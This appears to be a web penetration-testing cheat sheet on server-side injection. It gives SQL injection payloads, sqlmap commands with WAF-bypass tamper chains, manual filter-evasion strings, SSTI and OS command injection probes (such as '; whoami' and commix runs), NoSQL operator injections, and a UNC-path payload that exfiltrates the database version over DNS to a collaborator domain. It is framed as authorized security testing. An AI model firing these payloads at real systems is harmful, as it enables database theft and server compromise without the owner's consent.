# 5. SQL Injection & Other Server-Side Injection

**Where this applies on a static site:** search boxes, contact/login-less forms that hit a backend API, any `?id=`/`?category=` style parameter, SSTI in any templated contact-confirmation page.

## SQL Injection
### Test checklist
- [ ] Every parameter that touches a DB-backed feature (search, filters, product/category IDs)
- [ ] Error-based: does a single quote `'` trigger a DB error message?
- [ ] Boolean-based blind: `?id=1 AND 1=1` vs `?id=1 AND 1=2` \u2014 different responses?
- [ ] Time-based blind: `?id=1' OR SLEEP(5)--` \u2014 response delay?
- [ ] UNION-based: column count via `ORDER BY N--`, then `UNION SELECT`

**Payloads**
```
'
" 
' OR '1'='1
' OR '1'='1'--
' OR SLEEP(5)--
' UNION SELECT NULL,NULL,NULL--
1' AND 1=CONVERT(int,(SELECT @@version))--   # MSSQL error-based
```

### Linux (Kali)
```
sqlmap -u "https://target.com/search?q=test" --batch --level 3 --risk 2
sqlmap -u "https://target.com/search?q=test" --forms   # auto-detect & test all forms
sqlmap -r request.txt --batch        # from a saved Burp request for POST params/headers
```

### Windows
```
# sqlmap is Python, runs identically:
python sqlmap.py -u "https://target.com/search?q=test" --batch
# or via WSL for zero setup friction
```

## Server-Side Template Injection (SSTI)
Test on any field whose value gets echoed into a rendered page/email (e.g. "Thank you {{name}}" confirmation pages).
```
${7*7}      # if output is 49 -> likely Java/Freemarker/Velocity
{{7*7}}     # if output is 49 -> likely Jinja2/Twig
<%= 7*7 %>  # ERB
#{7*7}      # Ruby
```

## OS Command Injection
Test if any feature shells out (rare on pure static sites, but check contact-form-to-PDF generators, image resizers, etc.)
```
; whoami
| whoami
`whoami`
$(whoami)
& ping -c 3 127.0.0.1 &            # Linux target
& ping -n 3 127.0.0.1 &            # Windows target
```
**Kali:** `commix --url="https://target.com/convert?file=test"`
**Windows:** same `commix` script runs via Python natively or WSL.

**Impact framing:** confirmed SQLi = critical; SSTI = critical (often leads to RCE); OS command injection = critical. All three warrant immediate escalation/stop-and-report rather than continuing manual exploitation without authorization scope confirmation.

## Advanced / WAF Bypass Techniques

### sqlmap tamper scripts (the real toolkit, not just --batch)
```
sqlmap -u "https://target.com/search?q=test" --list-tampers       # see everything available
# Common effective single scripts:
sqlmap -u "..." --tamper=space2comment          # ' ' -> /**/,  bypasses space-based keyword filters
sqlmap -u "..." --tamper=charencode             # URL-encodes the whole payload
sqlmap -u "..." --tamper=randomcase             # SeLeCt instead of SELECT, bypasses case-sensitive blocklists
sqlmap -u "..." --tamper=apostrophemask         # replaces ' with its UTF-8 fullwidth equivalent
sqlmap -u "..." --tamper=between                # replaces > < with NOT BETWEEN 0 AND, bypasses comparison-operator filters
sqlmap -u "..." --tamper=versionedkeywords      # wraps keywords in MySQL version comments: /*!50000SELECT*/
# Chain several for layered WAFs:
sqlmap -u "..." --tamper=space2comment,charencode,randomcase --level=5 --risk=3
```

### Manual obfuscation when you don't have sqlmap in the loop (e.g. testing through a form/Burp Repeater)
```
' UNION/**/SELECT/**/NULL,NULL,NULL--                        # inline comments instead of spaces
' uNioN SeLeCt NULL,NULL--                                    # case alternation
' UNION SELECT 0x61646d696e--                                  # hex-encoded strings instead of quoted literals (bypasses quote-stripping filters)
'/*!50000UNION*/SELECT NULL,NULL--                             # MySQL version-comment keyword wrapping
' AND 1=1-- -                                                  # trailing dash-space, some parsers need the extra char to treat -- as a comment terminator
'||(SELECT 1)||'                                               # string concatenation operator instead of UNION, evades UNION-specific signatures
```

### Second-order SQLi (the payload lands somewhere, then fires later in a *different* query)
Test any field that gets stored and later reused server-side \u2014 a contact form's "company name" that later appears in an admin search or export is a classic case even on an otherwise static site.

### Out-of-band confirmation (when there's no visible error and no timing difference)
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.your-collaborator-domain.com\\share'))-- -   # MSSQL/MySQL UNC-path DNS exfil
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -                                                                   # fallback: pure time-based if OOB channels are blocked outbound
```
Use Burp Collaborator or a self-hosted `interactsh` instance to catch the DNS callback \u2014 confirms blind SQLi with zero reliance on response timing or content.

### NoSQL injection (if the backend turns out to be Mongo-based, common on modern "static" sites with a headless CMS)
```
{"$ne": null}                      # in a JSON body field, bypasses equality checks
' || '1'=='1                        # MongoDB-flavored boolean injection in string context
?search[$regex]=.*                  # operator injection via query-string array syntax
```

### WAF identification before picking a tamper strategy
```
wafw00f https://target.com           # identify Cloudflare / Akamai / Imperva / ModSecurity / AWS WAF etc. first
# then pick tamper scripts matched to that specific WAF rather than guessing blind
```

**Resources:** sqlmap's own tamper script source (`sqlmap/tamper/`) and `--list-tampers`, PortSwigger SQL injection cheat sheet, PayloadsAllTheThings SQL Injection section, OWASP Testing Guide (Testing for SQL Injection chapter).
